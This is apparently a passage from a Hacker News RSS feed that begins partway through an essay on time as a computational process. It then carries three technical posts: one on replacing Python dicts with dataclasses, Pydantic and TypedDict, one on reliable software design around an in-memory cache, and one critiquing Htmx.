<p>In our everyday life we’re typically looking at scenes involving objects that are perhaps tens of meters away from us. And given the speed of light that means photons from these objects get to us in less than a microsecond. But it takes our brains milliseconds to register what we’ve seen. And this disparity of timescales is what leads us to view the world as consisting of a sequence of states of space at successive moments in time. </p>
<p>If our brains “ran” a million times faster (i.e. at the speed of digital electronics) we’d perceive photons arriving from different parts of a scene at different times, and we’d presumably no longer view the world in terms of overall states of space existing at successive times. </p>
<p>The same kind of thing would happen if we kept the speed of our brains the same, but dealt with scenes of a much larger scale (as we already do in dealing with spacecraft, astronomy, etc.).</p>
<p>But while this affects what it is that we think time is “acting on”, it doesn’t ultimately affect the nature of time itself. Time remains that computational process by which successive states of the world are produced. Computational irreducibility gives time a certain rigid character, at least for computationally bounded observers like us. And the Principle of Computational Equivalence allows there to be a robust notion of time independent of the “substrate” that’s involved: whether us as observers, the everyday physical world, or, for that matter, the whole universe. </p>
        </div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Don't let dicts spoil your code (149 pts)]]></title>
            <link>https://roman.pt/posts/dont-let-dicts-spoil-your-code/</link>
            <guid>41781855</guid>
            <pubDate>Tue, 08 Oct 2024 21:10:14 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://roman.pt/posts/dont-let-dicts-spoil-your-code/">https://roman.pt/posts/dont-let-dicts-spoil-your-code/</a>, See on <a href="https://news.ycombinator.com/item?id=41781855">Hacker News</a></p>
<div id="readability-page-1" class="page"><div><div><p>table of contents</p><nav id="TableOfContents"><ul><li><a href="#whats-wrong-with-dicts">What’s wrong with dicts?</a><ul><li><a href="#dicts-are-opaque">Dicts are opaque</a></li><li><a href="#dicts-are-mutable">Dicts are mutable</a></li></ul></li><li><a href="#treat-dicts-as-the-wire-format">Treat dicts as the wire format</a></li><li><a href="#streamline-model-creation">Streamline model creation</a><ul><li><a href="#create-models-with-dataclasses">Create models with dataclasses</a></li><li><a href="#alternatively-create-models-with-pydantic">Alternatively, create models with Pydantic</a></li></ul></li><li><a href="#for-legacy-codebase-annotate-dicts-as-typedict">For legacy codebase, annotate dicts as TypeDict</a></li><li><a href="#for-key-value-stores-annotate-dicts-as-mappings">For key-value stores, annotate dicts as mappings</a></li><li><a href="#take-dicts-under-control">Take dicts under control</a></li></ul></nav></div><figure><img src="https://roman.pt/posts/dont-let-dicts-spoil-your-code/splash_hued0d13a2034a04fbb4bcad55138bdafa_423992_1000x400_fill_q75_box_smart1.jpg" width="1000" alt="Balance"><figcaption>Photo by <a href="https://unsplash.com/@martinsanchez">Martin Sanchez</a></figcaption></figure><p>How often do your simple prototypes or ad-hoc scripts turn into fully-fledged applications?</p><p>The simplicity of organic code growth has a flip side: it becomes too hard to maintain. The proliferation of dicts as primary data structures is a clear signal of tech debt in your code. Fortunately, modern Python provides many viable alternatives to plain dicts.</p><h2 id="whats-wrong-with-dicts">What’s wrong with dicts?</h2><h3 id="dicts-are-opaque">Dicts are opaque</h3><p>Functions that accept dicts are a nightmare to extend and modify. Usually, to change the function that takes a dictionary, you must manually trace the calls back to the roots, where this dict was created. There is often more than one call path, and if a program grows without a plan, you’ll likely have discrepancies in the dict structures.</p><h3 id="dicts-are-mutable">Dicts are mutable</h3><p>Changing dict values to fit a specific workflow is tempting, and programmers often abuse this functionality. In-place mutations may have different names: pre-processing, populating, enriching, data massage, etc. The result is the same. This manipulation hinders the structure of your data and makes it dependent on the workflow of your application.</p><p>Not only do dicts allow you to change their data, but they also allow you to change the very structure of objects. You can add or delete fields or change their types at will. Resorting to this is the worst felony you can commit to your data.</p><h2 id="treat-dicts-as-the-wire-format">Treat dicts as the wire format</h2><p>A common source of dicts in the code is deserializing from JSON. For example, from a third-party API response.</p><div><pre tabindex="0"><code data-lang="python"><span><span><span>&gt;&gt;&gt;</span> requests<span>.</span>get(<span>"https://api.github.com/repos/imankulov/empty"</span>)<span>.</span>json()
</span></span><span><span>{<span>'id'</span>: <span>297081773</span>,
</span></span><span><span> <span>'node_id'</span>: <span>'MDEwOlJlcG9zaXRvcnkyOTcwODE3NzM='</span>,
</span></span><span><span> <span>'name'</span>: <span>'empty'</span>,
</span></span><span><span> <span>'full_name'</span>: <span>'imankulov/empty'</span>,
</span></span><span><span> <span>'private'</span>: <span>False</span>,
</span></span><span><span><span>...</span>
</span></span><span><span>}
</span></span></code></pre></div><p><em>A dict, returned from the API.</em></p><p>Make a habit of treating dicts as a “wire format” and convert them immediately to data structures providing semantics.</p><figure><img src="https://roman.pt/posts/dont-let-dicts-spoil-your-code/serializer-deserializer.png" alt="Use serializer and deserializer to convert between wire format and internal representation" width="600"><figcaption><p>Use serializer and deserializer to convert between wire format and internal representation</p></figcaption></figure><p>The implementation is straightforward.</p><ul><li>Define your domain models. A domain model is simply a class in your application.</li><li>Fetch and deserialize in the same step.</li></ul><p>In Domain-Driven Design (DDD), this pattern is known as the anti-corruption layer. On top of semantic clarity, domain models provide a natural layer that decouples the exterior architecture from your application’s business logic.</p><p>Two implementations of a function retrieving repository info from GitHub:</p><div><p><i data-feather="alert-octagon"></i>
Returning a dict</p><div><pre tabindex="0"><code data-lang="python"><span><span><span>import</span> <span>requests</span>
</span></span><span><span>
</span></span><span><span><span>def</span> <span>get_repo</span>(repo_name: <span>str</span>):
</span></span><span><span>    <span>"""Return repository info by its name."""</span>
</span></span><span><span>    <span>return</span> requests<span>.</span>get(<span>f</span><span>"https://api.github.com/repos/</span><span>{</span>repo_name<span>}</span><span>"</span>)<span>.</span>json()
</span></span></code></pre></div><p>The output of the function is opaque and needlessly verbose. The format is defined outside of your code.</p><div><pre tabindex="0"><code data-lang="python"><span><span><span>&gt;&gt;&gt;</span> get_repo(<span>"imankulov/empty"</span>)
</span></span><span><span>{<span>'id'</span>: <span>297081773</span>,
</span></span><span><span> <span>'node_id'</span>: <span>'MDEwOlJlcG9zaXRvcnkyOTcwODE3NzM='</span>,
</span></span><span><span> <span>'name'</span>: <span>'empty'</span>,
</span></span><span><span> <span>'full_name'</span>: <span>'imankulov/empty'</span>,
</span></span><span><span> <span>'private'</span>: <span>False</span>,
</span></span><span><span> <span># Dozens of lines with unnecessary attributes, URLs, etc.</span>
</span></span><span><span> <span># ...</span>
</span></span><span><span>}
</span></span></code></pre></div></div><div><p><i data-feather="check-square"></i>
Returning a domain model</p><div><pre tabindex="0"><code data-lang="python"><span><span>
</span></span><span><span><span>class</span> <span>GitHubRepo</span>:
</span></span><span><span>    <span>"""GitHub repository."""</span>
</span></span><span><span>    <span>def</span> __init__(self, owner: <span>str</span>, name: <span>str</span>, description: <span>str</span>):
</span></span><span><span>        self<span>.</span>owner <span>=</span> owner
</span></span><span><span>        self<span>.</span>name <span>=</span> name
</span></span><span><span>        self<span>.</span>description <span>=</span> description
</span></span><span><span>
</span></span><span><span>    <span>def</span> <span>full_name</span>(self) <span>-&gt;</span> <span>str</span>:
</span></span><span><span>        <span>"""Get the repository full name."""</span>
</span></span><span><span>        <span>return</span> <span>f</span><span>"</span><span>{</span>self<span>.</span>owner<span>}</span><span>/</span><span>{</span>self<span>.</span>name<span>}</span><span>"</span>
</span></span><span><span>
</span></span><span><span><span>def</span> <span>get_repo</span>(repo_name: <span>str</span>) <span>-&gt;</span> GitHubRepo:
</span></span><span><span>    <span>"""Return repository info by its name."""</span>
</span></span><span><span>    data <span>=</span> requests<span>.</span>get(<span>f</span><span>"https://api.github.com/repos/</span><span>{</span>repo_name<span>}</span><span>"</span>)<span>.</span>json()
</span></span><span><span>    <span>return</span> GitHubRepo(data[<span>"owner"</span>][<span>"login"</span>], data[<span>"name"</span>], data[<span>"description"</span>])
</span></span></code></pre></div><div><pre tabindex="0"><code data-lang="python"><span><span><span>&gt;&gt;&gt;</span> get_repo(<span>"imankulov/empty"</span>)
</span></span><span><span><span>&lt;</span>GitHubRepo at <span>0x103023520</span><span>&gt;</span>
</span></span></code></pre></div></div><p>While the example below has more code, this solution is better than the previous one if we maintain and extend the codebase.</p><p>Let’s see what the differences are.</p><ul><li>The data structure is clearly defined, and we can document it with as many details as necessary.</li><li>The class also has a method <code>full_name()</code> implementing some class-specific business logic. Unlike dicts, data models allow you to co-locate the code and data.</li><li>GitHub API’s dependency is isolated in the function <code>get_repo()</code>. The GitHubRepo object doesn’t need to know anything about the external API and how objects are created. This way, you can modify the deserializer independently from the model or add new ways of creating objects: from pytest fixtures, the GraphQL API, the local cache, etc.</li></ul><p>☝️ Ignore fields coming from the API if you don’t need them. Keep only those that you use.</p><p>In many cases, you can and should ignore most of the fields coming from the API, adding only the fields that the application uses. Not only duplicating the fields is a waste of time, but it also makes the class structure rigid, making it hard to adopt changes in the business logic or add support to the new version of the API. From the point of view of testing, fewer fields mean fewer headaches in instantiating the objects.</p><h2 id="streamline-model-creation">Streamline model creation</h2><p>Wrapping dicts require creating a lot of classes. You can simplify your work by employing a library that makes “better classes” for you.</p><h3 id="create-models-with-dataclasses">Create models with dataclasses</h3><p>Starting from version 3.7, Python provides <a href="https://docs.python.org/3/library/dataclasses.html">Data Classes</a>. The <code>dataclasses</code> module of the standard library provides a decorator and functions for automatically adding generated special methods such as <code>__init__()</code> and <code>__repr__()</code> to your classes. Therefore, you write less boilerplate code.</p><p>I use dataclasses for small projects or scripts where I don’t want to introduce extra dependencies. That’s how the <code>GitHubRepo</code> model looks like with dataclasses.</p><div><pre tabindex="0"><code data-lang="python"><span><span><span>from</span> <span>dataclasses</span> <span>import</span> dataclass
</span></span><span><span>
</span></span><span><span><span>@dataclass</span>(frozen<span>=</span><span>True</span>)
</span></span><span><span><span>class</span> <span>GitHubRepo</span>:
</span></span><span><span>    <span>"""GitHub repository."""</span>
</span></span><span><span>    owner: <span>str</span>
</span></span><span><span>    name: <span>str</span>
</span></span><span><span>    description: <span>str</span>
</span></span><span><span>
</span></span><span><span>    <span>def</span> <span>full_name</span>(self) <span>-&gt;</span> <span>str</span>:
</span></span><span><span>        <span>"""Get the repository full name."""</span>
</span></span><span><span>        <span>return</span> <span>f</span><span>"</span><span>{</span>self<span>.</span>owner<span>}</span><span>/</span><span>{</span>self<span>.</span>name<span>}</span><span>"</span>
</span></span></code></pre></div><p>When I create Data Classes, my Data Classes are almost always defined as frozen. Instead of modifying an object, I create a new instance with <code>dataclasses.replace()</code>. Read-only attributes bring peace of mind to a developer, reading and maintaining your code.</p><h3 id="alternatively-create-models-with-pydantic">Alternatively, create models with Pydantic</h3><p>Recently <a href="https://pydantic-docs.helpmanual.io/">Pydantic</a>, a third-party data-validation library became my go-to choice for model definition. Compared with dataclasses, they are much more powerful. I especially like their serializers and deserializers, automatic type conversions, and custom validators.</p><p>Serializers simplify storing records to external storage, for example, for caching. Type conversions are especially helpful when converting a complex hierarchical JSON to a hierarchy of objects. And validators are helpful for everything else.</p><p>With Pydantic, the same model can look like this.</p><div><pre tabindex="0"><code data-lang="python"><span><span><span>from</span> <span>pydantic</span> <span>import</span> BaseModel
</span></span><span><span>
</span></span><span><span>
</span></span><span><span><span>class</span> <span>GitHubRepo</span>(BaseModel):
</span></span><span><span>    <span>"""GitHub repository."""</span>
</span></span><span><span>    owner: <span>str</span>
</span></span><span><span>    name: <span>str</span>
</span></span><span><span>    description: <span>str</span>
</span></span><span><span>
</span></span><span><span>    <span>class</span> <span>Config</span>:
</span></span><span><span>        frozen <span>=</span> <span>True</span>
</span></span><span><span>
</span></span><span><span>    <span>def</span> <span>full_name</span>(self) <span>-&gt;</span> <span>str</span>:
</span></span><span><span>        <span>"""Get the repository full name."""</span>
</span></span><span><span>        <span>return</span> <span>f</span><span>"</span><span>{</span>self<span>.</span>owner<span>}</span><span>/</span><span>{</span>self<span>.</span>name<span>}</span><span>"</span>
</span></span></code></pre></div><p>Online service <a href="https://jsontopydantic.com/">jsontopydantic.com</a> saves my time creating Pydantic models from third-party APIs. I copy the response examples from their documentation to the service, and the service returns Pydantic models.</p><figure><img src="https://roman.pt/posts/dont-let-dicts-spoil-your-code/jsontopydantic.png" alt="jsontopydantic.com converts Todoist API response to Pydantic model" width="800"><figcaption><p>jsontopydantic.com converts Todoist API response to a Pydantic model</p></figcaption></figure><p>You can find some examples of me using Pydantic, in the post <a href="https://roman.pt/posts/time-series-caching/">Time Series Caching with Python and Redis</a>.</p><h2 id="for-legacy-codebase-annotate-dicts-as-typedict">For legacy codebase, annotate dicts as TypeDict</h2><p>Python 3.8 introduced so-called <a href="https://www.python.org/dev/peps/pep-0589/">TypedDicts</a>. In runtime, they behave like regular dicts but provide extra information about their structure for developers, type validators, and IDEs.</p><p>If you come across the dict-heavy legacy code and can’t refactor everything yet, at least you can annotate your dicts as typed ones.</p><div><pre tabindex="0"><code data-lang="python"><span><span><span>from</span> <span>typing</span> <span>import</span> TypedDict
</span></span><span><span>
</span></span><span><span>
</span></span><span><span><span>class</span> <span>GitHubRepo</span>(TypedDict):
</span></span><span><span>    <span>"""GitHub repository."""</span>
</span></span><span><span>    owner: <span>str</span>
</span></span><span><span>    name: <span>str</span>
</span></span><span><span>    description: <span>str</span>
</span></span><span><span>
</span></span><span><span>repo: GitHubRepo <span>=</span> {
</span></span><span><span>    <span>"owner"</span>: <span>"imankulov"</span>,
</span></span><span><span>    <span>"name"</span>: <span>"empty"</span>,
</span></span><span><span>    <span>"description"</span>: <span>"An empty repository"</span>,
</span></span><span><span>}
</span></span></code></pre></div><p>Below, I provide two screenshots from PyCharm to show how adding typing information can streamline your development experience with the IDE and protect you against errors.</p><figure><img src="https://roman.pt/posts/dont-let-dicts-spoil-your-code/typed-dict-value-type.png" alt="PyCharm knows about the value type and provides autocomplete" width="650"><figcaption><p>PyCharm knows about the value type and provides autocomplete</p></figcaption></figure><figure><img src="https://roman.pt/posts/dont-let-dicts-spoil-your-code/typed-dict-missing-key.png" alt="PyCharm knows about the missing key and issues a warning" width="650"><figcaption><p>PyCharm knows about the missing key and issues a warning</p></figcaption></figure><h2 id="for-key-value-stores-annotate-dicts-as-mappings">For key-value stores, annotate dicts as mappings</h2><p>A legitimate use-case of dict is a key-value store where all the values have the same type, and keys are used to look up the value by key.</p><div><pre tabindex="0"><code data-lang="python"><span><span>colors <span>=</span> {
</span></span><span><span>    <span>"red"</span>: <span>"#FF0000"</span>,
</span></span><span><span>    <span>"pink"</span>: <span>"#FFC0CB"</span>,
</span></span><span><span>    <span>"purple"</span>: <span>"#800080"</span>,
</span></span><span><span>}
</span></span></code></pre></div><p><em>A dict, used as a mapping.</em></p><p>When instantiating or passing such dict to a function, consider hiding implementation details by annotating the variable type as Mapping or MutableMapping. On the one hand, it may sound like overkill. Dict is default and by far the most common implementation of a MutableMapping. On the other hand, by annotating a variable with mapping, you can specify the types for keys and values. Besides, in the case of a Mapping type, you send a clear message that an object is supposed to be immutable.</p><div><p>Example</p><p>I defined a color mapping and annotated a function. Notice how the function uses the operation allowed for dicts but disallowed for Mapping instances.</p><div><pre tabindex="0"><code data-lang="python"><span><span><span># file: colors.py</span>
</span></span><span><span><span>from</span> <span>typing</span> <span>import</span> Mapping
</span></span><span><span>
</span></span><span><span>colors: Mapping[<span>str</span>, <span>str</span>] <span>=</span> {
</span></span><span><span>    <span>"red"</span>: <span>"#FF0000"</span>,
</span></span><span><span>    <span>"pink"</span>: <span>"#FFC0CB"</span>,
</span></span><span><span>    <span>"purple"</span>: <span>"#800080"</span>,
</span></span><span><span>}
</span></span><span><span>
</span></span><span><span><span>def</span> <span>add_yellow</span>(colors: Mapping[<span>str</span>, <span>str</span>]):
</span></span><span><span>    colors[<span>"yellow"</span>] <span>=</span> <span>"#FFFF00"</span>
</span></span><span><span>
</span></span><span><span><span>if</span> __name__ <span>==</span> <span>"__main__"</span>:
</span></span><span><span>    add_yellow(colors)
</span></span><span><span>    <span>print</span>(colors)
</span></span></code></pre></div><p>Despite wrong types, no issues in runtime.</p><div><pre tabindex="0"><code data-lang="bash"><span><span>$ python colors.py
</span></span><span><span><span>{</span><span>'red'</span>: <span>'#FF0000'</span>, <span>'pink'</span>: <span>'#FFC0CB'</span>, <span>'purple'</span>: <span>'#800080'</span>, <span>'yellow'</span>: <span>'#FFFF00'</span><span>}</span>
</span></span></code></pre></div><p>To check the validity, I can use mypy, which raises an error.</p><div><pre tabindex="0"><code data-lang="bash"><span><span>$ mypy colors.py
</span></span><span><span>colors.py:11: error: Unsupported target <span>for</span> indexed assignment <span>(</span><span>"Mapping[str, str]"</span><span>)</span>
</span></span><span><span>Found <span>1</span> error in <span>1</span> file <span>(</span>checked <span>1</span> <span>source</span> file<span>)</span>
</span></span></code></pre></div></div><h2 id="take-dicts-under-control">Take dicts under control</h2><p>Keep an eye on your dicts. Don’t let them take control of your application. As with every piece of technical debt, the further you postpone introducing proper data structures, the more complex the transition becomes.</p></div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Practices of Reliable Software Design (116 pts)]]></title>
            <link>https://entropicthoughts.com/practices-of-reliable-software-design</link>
            <guid>41781777</guid>
            <pubDate>Tue, 08 Oct 2024 21:01:22 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://entropicthoughts.com/practices-of-reliable-software-design">https://entropicthoughts.com/practices-of-reliable-software-design</a>, See on <a href="https://news.ycombinator.com/item?id=41781777">Hacker News</a></p>
<div id="readability-page-1" class="page"><div>
                <div id="table-of-contents" role="doc-toc">
<h2>Table of Contents</h2>
<div id="text-table-of-contents" role="doc-toc">
<ul>
<li><a href="#org4458e36">The Practices</a>
<ul>
<li><a href="#orgc18eb36">1. Use Off-The-Shelf</a></li>
<li><a href="#orgc87cadf">2. Cost And Reliability Over Features</a></li>
<li><a href="#org6591e08">3. Idea To Production Quickly</a></li>
<li><a href="#orgf8ec978">4. Simple Data Structures</a></li>
<li><a href="#orgd69bbd5">5. Reserve Resources Early</a></li>
<li><a href="#org8c9d253">6. Set Maximums</a></li>
<li><a href="#orgdc1861b">7. Make Testing Easy</a></li>
<li><a href="#orgbf5c7d5">8. Embed Performance Counters</a></li>
</ul>
</li>
<li><a href="#org93252f2">Other practices</a></li>
</ul>
</div>
</div>

<p>
I was nerd-sniped. Out of the blue, a friend asked me,
</p>

<blockquote>
<p>
If you would build an in-memory cache, how would you do it?
</p>

<p>
It should have good performance and be able to hold many entries. Reads are more
common than writes. I know how I would do it already, but I’m curious about your
approach.
</p>
</blockquote>

<p>
I couldn’t not take the bait.
</p>

<p>
In the process of answering the question and writing the code, I discovered a
lot of things happened in my thought processes that have come with experience.
These are things that make software engineering easier, but that I know I
wouldn’t have considered when I was less experienced.
</p>

<p>
I started writing a long and sprawling article on it, but it didn’t quite hit
the right notes, so this is a much abbreviated version. Time allowing, I might
expand on some of these practices in separate articles that can be more focused
and concise.
</p>
<section id="outline-container-org4458e36">
<h2 id="org4458e36">The Practices</h2>
<p>
Here are all eight practices I have adopted with experience that I had use for
during the exercise of writing a fast, small, in-memory cache.
</p>
<div id="outline-container-orgc18eb36">
<h2 id="orgc18eb36">1. Use Off-The-Shelf</h2>
<div id="text-orgc18eb36">
<p>
Our first response to the question should be something like, <i>can we use
Redis?</i>
</p>

<p>
As long as we’re not dealing with a very expensive or complicated component,
or a part of the software that generates most of its value, we should default
to off-the-shelf solutions. I have written before about
<a href="https://entropicthoughts.com/build-vs-buy.html">why we want to build expensive and complicated
stuff</a>.
</p>
</div>
</div>
<div id="outline-container-orgc87cadf">
<h2 id="orgc87cadf">2. Cost And Reliability Over Features</h2>
<div id="text-orgc87cadf">
<p>
If we find out we can’t use an off-the-shelf solution, we need to build
something cheap and reliable. That usually means not having all the bells and
whistles, but that’s a trade-off worth making. One of my favourite ways of
phrasing this is
</p>

<blockquote>
<p>
It is much easier to add features to reliable software, than it is to add
reliability to featureful software.
</p>
</blockquote>

<p>
Besides, it’s very easy to accidentally think you need features that you
don’t actually need.
</p>

<p>
I’m not a big proponent of a design phase. Sometimes you need it, but I think
if you need to design your software up front, it will cost you more to
develop and it will take longer to finish. On the other hand, sometimes a
little up front analysis allow you to eliminate large portions of the design
space before even writing a single line of code.
</p>

<p>
In the case of this cache, we may ask question about item durability
requirements, request rates, sizes, eviction requirements, and so on. When we
do, we would in this case find out that we can get by with a single thread
accessing a single data structure, and no active eviction process. That’s a
huge win! It simplifies the design a lot.
</p>
</div>
</div>
<div id="outline-container-org6591e08">
<h2 id="org6591e08">3. Idea To Production Quickly</h2>
<div id="text-org6591e08">
<p>
Part of the reasoning of the previous practice was that it’s easy to think
you need features you don’t. How do you, then, know which features you need?
For the most part, the cheapest and most reliable way to find this out is in
production.
</p>

<p>
If we deploy the bare minimum feature set, we will very quickly find out what
additional features are most commonly requested, and it’s not going to be the
ones we think. And even if they are, there are usually other requirements on
them that we wouldn’t have caught ahead of time.
</p>

<p>
This practice ties in strongly with the previous one: use analysis to pare
down the requirements to the bare minimum, and then write the bare minimum
code to support them, and get it into production to find out more about the
problem we’re trying to solve.
</p>
</div>
</div>
<div id="outline-container-orgf8ec978">
<h2 id="orgf8ec978">4. Simple Data Structures</h2>
<div id="text-orgf8ec978">
<p>
Complicated data structures are often tempting. Especially when there are
libraries that handle them for us. The problem with complicated data
structures is that it’s easy to misuse them due to a lack of understanding,
which leads to performance problems and bugs.
</p>

<p>
In the case of this specific cache, the number of entries that needed to be
stored (we can use queueing theory to calculate this from the <abbr>ttl</abbr> and the
rate of writes) would comfortably be addressed by 19.9 bits of information –
in other words, we can just use a plain array to store each item, and hash
the key to address it.<label for="fn.1">1</label><span><sup>1</sup> We found out earlier we didn’t need to actually
evict expired items. If we would have needed to, we could keep a separate
index for the item nearest to expiry using a min-heap. This is cheaper and
simpler than something fully sorted, which it might be tempting to reach for
otherwise. Instead of a separate process, we can rely on the high request
rate to trigger eviction of items, thus trading a little latency to avoid
designing for concurrency up front. Another alternative is to provide a
separate API that triggers eviction of the oldest expired entry, letting the
caller decide how much time to spend on eviction. This means the caller can
vary that time to make dynamic latency–resource requirement tradeoffs.</span>
</p>
</div>
</div>
<div id="outline-container-orgd69bbd5">
<h2 id="orgd69bbd5">5. Reserve Resources Early</h2>
<div id="text-orgd69bbd5">
<p>
Another potentially controversial decision I made for the cache I designed
was that it allocated the full index array up front. This sounds wasteful,
but we can tell from back-of-the-napkin analysis that it would need most of
this space anyway during continuous operation, so nothing would be saved by
postponing the allocation.
</p>

<p>
What early allocation does is it allows the software to crash early if the
required resources are not available. This is a desirable trait – it saves
the operator the frustration of finding that out only once they’ve gone to
bed and receive a call from PagerDuty. It also makes it easier to do capacity
planning and reason about performance.
</p>


</div>
</div>
<div id="outline-container-org8c9d253">
<h2 id="org8c9d253">6. Set Maximums</h2>
<div id="text-org8c9d253">
<p>
I chose a sloppy open-addressing-with-linear-probing-based method for
handling hash collisions in addressing items that is simple and has very good
performance in the typical case (again, only very rudimentary arithmetic
needed to find this out for any specific use case), but can have very bad
performance in the worst case: it can end up iterating through the entire
array of all items on every cache miss.
</p>

<p>
Since perfect recall turned out not to be necessary<label for="fn.2">2</label><span><sup>2</sup> This is again why
asking questions about requirements is so important!</span>, it was trivial to set
a maximum iteration limit of e.g. 500 steps. This makes sure the worst case
is not too far from the average case, at the cost of a few more cache misses.
Does 500 steps optimise this tradeoff? No. This is one thing I don’t know how
to compute ahead of time, so production experience will have to inform future
changes to the maximum number of steps.
</p>

<p>
The important thing is usually not what the maximum is, just that there is
<i>some</i> maximum, so we’re not waiting surprisingly long times for things to
complete.
</p>

<p>
Given the static allocation requirements, we might also want to set a limit
on how much data can be stored in the cache at any given time, so we don’t
accidentally blow memory limits in the middle of the night. In general, limit
all the things! If someone is unhappy with the limit, revise the limit –
don’t remove it.
</p>
</div>
</div>
<div id="outline-container-orgdc1861b">
<h2 id="orgdc1861b">7. Make Testing Easy</h2>
<div id="text-orgdc1861b">
<p>
To avoid regressions and ensure expected behaviour, I made the cache accept
commands on standard input. This means we can start the cache and type <code>write
   hello world</code> in the terminal window to store <code>"world"</code> for the key <code>"hello"</code>.
</p>

<p>
But it also means we can write up a long string of commands in a file, and
pipe that into the cache. If we then also give the cache a command that
asserts the last value read is something specific<label for="fn.3">3</label><span><sup>3</sup> It also had a few more
commands related to testing, such as a sleep command that forces it to
believe time has passed (for testing expiration) and a dump command that just
prints out everything it is currently storing, and whether it’s deleted,
expired, or active.</span>, we can write up a whole test protocol in a plain text
file, and pipe it to the program to verify its functionality. The input file
might look like
</p>

<p><label>In[1]:</label></p><div>
<pre><span># </span><span>Cache empty, should not find anything.</span>
read abc
assert undef

<span># </span><span>Write and then immediately read the same thing back.</span>
write abc 123
read abc
assert 123

<span># </span><span>Different key should get nothing.</span>
read xyz
assert undef

<span># </span><span>Write different value, then read, should match.</span>
write abc 567
read abc
assert 567

<span># </span><span>Write one more key, abc should still be around.</span>
write xyz 444
read abc
assert 567
</pre>
</div>

<p>
In isolation, each of these things is very simple (accept commands at <abbr>cli</abbr>,
allow asserting previous read) but it’s the combination of them, together with
the tools that already exist at hand (shell input redirection) that enables
faster cycle times and thus more reliable software.
</p>
</div>
</div>
<div id="outline-container-orgbf5c7d5">
<h2 id="orgbf5c7d5">8. Embed Performance Counters</h2>
<div id="text-orgbf5c7d5">
<p>
Finally, we will want to know how our program spends its time. We can do that
with profiling, or deduce it through logs, but the easiest way to do it is to
embed performance counters. These are variables that accumulate how much of
something is happening. It can be things like
</p>

<ul>
<li>How much time is spent reading keys?</li>
<li>How much time is spent writing key–value pairs?</li>
<li>How much time is spent on I/O?</li>
<li>How many cache misses have there been?</li>
<li>How many keys have we had to linearly search over?</li>
<li>How many times has the iteration limit of 500 been reached?</li>
</ul>

<p>
Note that all of these are accumulative, so we don’t ask “how much storage
space is currently allocated?”, but we ask instead the pair of questions
</p>

<ul>
<li>How much storage space have we allocated in total from startup until now?</li>
<li>How much storage space have we freed in total from startup until now?</li>
</ul>

<p>
By breaking the measurement apart into two time-dependent totals we can learn
significantly more about how our system behaves.
</p>

<p>
How these numbers evolve over time is also a useful indicator. For example,
the value of “how many keys have we had to linearly search over?” might
increase steadily (indicating relatively even distribution of hash
collisions) or it jumps up a lot sometimes (indicating sudden burst of
collisions). These are useful things to be able to tell apart. In combination
with “How many times has the iteration limit been reached” it tells us a lot
of the pressures put on the system.
</p>
</div>
</div>
</section>
<section id="outline-container-org93252f2">
<h2 id="org93252f2">Other practices</h2>
<p>
There are surely many more of these insights gained from years of software
engineering, but these are the ones I thought of during this exercise. I’d be
happy to hear from you about others you are thinking about! If nothing else, I
hope that could teach me to be a better software engineer.
</p>
</section>

            </div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[A modest critique of Htmx (231 pts)]]></title>
            <link>https://chrisdone.com/posts/htmx-critique/</link>
            <guid>41781457</guid>
            <pubDate>Tue, 08 Oct 2024 20:19:57 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://chrisdone.com/posts/htmx-critique/">https://chrisdone.com/posts/htmx-critique/</a>, See on <a href="https://news.ycombinator.com/item?id=41781457">Hacker News</a></p>
<div id="readability-page-1" class="page"><div>



<p>At work, we really like the basic simple idea of Htmx. Based on using
Htmx in a non-trivial user interface, across a team, we’ve found that
the following cases are actually not simple and are quite
complicated.</p>
<h2 id="inheritance-of-htmx-properties-is-a-definite-mistake">Inheritance of
Htmx properties is a definite mistake</h2>
<p>Across pieces of code, it’s very surprising and it’s implicit. Like
in CSS, inheritance is a cheap hack but you get what you pay for.</p>
<p>It contradicts <a href="https://htmx.org/essays/locality-of-behaviour/">the author’s
reasonable argument of locality of behaviour.</a> It’s not local, it
comes from all the way up there or some other module. Pretty much
dynamic binding.</p>
<p>Default inheritance differs across various properties
(e.g.&nbsp;<code>hx-delete</code> is not inherited, but
<code>hx-confirm</code> and <code>hx-ext</code> are). So you have to
remember these exceptions and you end up just being explicit about
everything, which means inheritance is pointless.</p>
<h2 id="most-interesting-web-apps-cannot-replace-wholesale-a-dom-element">Most
interesting web apps cannot replace wholesale a DOM element</h2>
<p>Because DOM elements almost always have browser-local state, such as
the open/closed state of a <code>&lt;details&gt;</code> element, the
input of an <code>&lt;input&gt;</code> element, the open/close state of
a dropdown element (which, note, is not encoded by an attribute of the
element when you click it). All of this state is lost if you replace
outerHTML directly with the naive happy path of Htmx.</p>
<p>Even <a href="https://v1.htmx.org/extensions/morphdom-swap/">morphdom</a>
overwrites some things you’d expect it not to, so we had to patch it to
avoid messing with input elements, and details elements.</p>
<h2 id="storing-state-in-the-dom-element-itself-is-a-bad-idea">Storing
state in the DOM element itself is a bad idea</h2>
<p><a href="https://v1.htmx.org/extensions/morphdom-swap/">Morphdom</a>
is intended to correct the pains of the previous heading, but we
discovered that the way that Htmx works <em>assumes</em> it’s based on
replacing elements wholesale: it stores the request queue for the
element on the DOM element itself. When you kick off a request, either
from this element or from another that points to it, you have a request
queue. Some bad failure modes are avoided by wholesale-replacing the DOM
element, as the queue is reset. But with morphdom, the queue is retained
because the element is retained. You’re now in a sort of <a href="https://en.wikipedia.org/wiki/Undefined_behavior">undefined
behavior land</a>, where the designs of Htmx are violated.</p>
<h2 id="the-default-queuing-mode-is-bonkers">The default queuing mode is
bonkers</h2>
<p>By default, Htmx will cancel requests that are in-flight if you
trigger another request on the same queue (element). That’s the default
strategy. We discovered this afterwards. It’s highly unintuitive, it
meant we were losing work.</p>
<h2 id="event-triggers-are-non-local">Event triggers are non-local</h2>
<p>Event triggers often help to make things happen, but they’re a
non-local effect, and suffer from similar issues as property
inheritance. A bit of DSL work in the server-side language can help with
this, but it feels like old-school JavaScript callback-based programming
to some extent; where you “subscribe” to an event happening and do
something.</p>
<h2 id="component-state-cannot-be-maintained-very-well">Component state
cannot be maintained very well</h2>
<p>A broader problem, similar to the DOM element state issue, is that
your own components have their own state. E.g. if you want a page that
consists of three sections that have their own state that the server
needs (e.g.&nbsp;which page of a set of results) and state that some
e.g.&nbsp;React or WebComponents need, then you have a problem of
synchronising state between a parent component and the child
component.</p>
